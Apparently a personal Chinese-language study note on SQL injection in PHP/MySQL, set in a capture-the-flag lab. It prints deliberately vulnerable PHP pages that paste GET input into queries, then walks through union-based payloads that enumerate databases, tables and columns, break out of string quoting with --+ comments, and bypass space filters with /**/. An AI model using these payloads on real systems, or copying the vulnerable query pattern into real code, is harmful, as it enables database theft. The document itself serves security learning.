## 注入原理

在 php 中, 我们可以使用如下语句来操作一个 MySQL 数据库:

```php
$sql = "SELECT username,password FROM users WHERE id = ".$_GET["id"];
```

在 php 中, `.` 的语法表示字符串的拼接. 我们如果传入一个 1, 则会调用如下查询语句:

```php
$sql = "SELECT username,password FROM users WHERE id = 1";
```

假设程序没有做任何的过滤和限制, 则存在 SQL 注入漏洞. 比如我们可以在这个 1 后面, 写更多的 Sql 语句, 比如这样子:

```php
$_GET["id"] ="1 union select username,password from user"
```

则可以访问到所有的用户名和密码. 因为原本的语句已经变成了:

```php
$sql = "SELECT username,password FROM users WHERE id = 1 union select username,password from user;"
```

## 常见注入及方法

### 整型注入

参考源代码如下, 该段代码为经典的整型注入漏洞源码.

```php
<meta charset="utf-8">
<?php
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    $host = 'localhost';
    $user = 'admin';
    $pass = 'root';
    $conn = mysqli_connect($host, $user, $pass, 'test');
    if (!$conn) {
        die('连接失败:' . mysqli_error($conn));
    }
    mysqli_query($conn, "set names utf8"); //设置编码, 防止中文乱码

    $sql = "SELECT id,username from users where id=$id";
    $result = mysqli_query($conn, $sql);
    if (!$result) {
        die("无法取得数据: " . mysqli_error($conn));
    }

    echo '<h2>MYSql Test';
    echo '<table border="1"><tr><td>ID</td><td>Username</td></tr>';
    while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
        echo "<tr><td> {$row['id']}</td>".
            "<td>{$row['username']}</td>".
            "</tr>";
    }
    echo '</table>';
    mysqli_close($conn);
} else {
    echo '试试 ?id=1';
}
```

首先, 我们应该确认列数. 只要 SQL 语句没有报错, 则成立, 取成立的最大值即可.

这里使用 `Order by 1~n` 来判断列数. 当 n=3 的时候, 代码报错, 说明其实只有两列

![[attachments/Pasted image 20250412213808.png]]

随后, 使用联合查询 Union, 获取所有的数据库名称:

```sql
1 union SELECT 1,schema_name FROM information_schema.schemata;
```

![[attachments/Pasted image 20250412214008.png]]

有了所有数据库的名称, 就可以查看需要查询的数据库的表名是什么了:

```php
1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=/*数据库名称 需要加引号*/"admin";
```

本题查询 `test` 表, 可以看到如下内容:

![[attachments/Pasted image 20250412214807.png]]

随后, 可以查询对应列的内容. (这里和上面不同的是, 使用的是 `.columns`)

```php
1 union select 1,group_concat(column_name) from information_schema.columns where table_schema="test";
```

![[attachments/Pasted image 20250412215100.png]]

随后, 获取对应的列的内容是什么:

```php
1 union select 1,group_concat(i_am_f1ag_column/*列*/) from f1ag_table/*表*/
```

![[attachments/Pasted image 20250412220003.png]]

> [!warning] 注意
> 这里的列名和表名都没有引号!  直接写即可, 否则会报错.

### 字符型注入

其实就是对上面方法的扩展. 刚才的整数中, 数字后面就什么都没有了, 可是如果传入的是字符串呢? 下面是典型的字符注入案例:

```php
<meta charset="utf-8">
<?php
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    $host = 'localhost';
    $user = 'admin';
    $pass = 'root';
    $conn = mysqli_connect($host, $user, $pass, 'test');
    if (!$conn) {
        die('连接失败:' . mysqli_error($conn));
    }
    mysqli_query($conn, "set names utf8"); //设置编码, 防止中文乱码

    $sql = "SELECT id,username from users where id=\"$id\"";
    $result = mysqli_query($conn, $sql);
    if (!$result) {
        die("无法取得数据: " . mysqli_error($conn));
    }

    echo '<h2>MYSql Test';
    echo '<table border="1"><tr><td>ID</td><td>Username</td></tr>';
    while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
        echo "<tr><td> {$row['id']}</td>".
            "<td>{$row['username']}</td>".
            "</tr>";
    }
    echo '</table>';
    mysqli_close($conn);
} else {
    echo '试试 ?id=1';
}
```

我们发现, 其中出现了 `""`, 我们写的东西如果在引号里面则无效. 所以我们需要再传入一个双引号来绕过原有的双引号. 

我们可以考虑使用 `"` 来绕过, 但是后面的语句还有, 这里可以使用 `--+` 来绕过. 因为 `--+` 代表的就是注释, 会忽略后面的所有语句.

```sql
1 Order by 3--+
```

![[attachments/Pasted image 20250412223252.png]]

这样就成功的获取到表的数目了. 后面的和普通的整型注入基本一致, 参考如下:

> [!note] 字符注入基本步骤
> 其实也算是通用的注入基本步骤啦, 大概就是 `1" {SQL注入语句} --+`
> - 确认列数:  `1" Order by 1~n--+`
> - 查看数据库名称:  `1" union SELECT 1,schema_name FROM information_schema.schemata;--+`
> - 查看表名: `1" union select 1,group_concat(table_name) from information_schema.tables where table_schema="test";--+`
> - 查看表的内容: `1" union select 1,group_concat(column_name) from information_schema.columns where table_schema="test";--+`
> - 获取对应列的内容: `1" union select 1,group_concat(i_am_f1ag_column) from f1ag_table;--+`

成功得到 Flag:

![[attachments/Pasted image 20250412224557.png]]

### 空格过滤绕过

如果需要过滤空格, 可以使用注释 `/**/` 来绕过. 直接放在语句中间即可代表空格, 比如这样子的 payload:

```sql
SELECT/*替换空格*/password/**/FROM/**/Members
```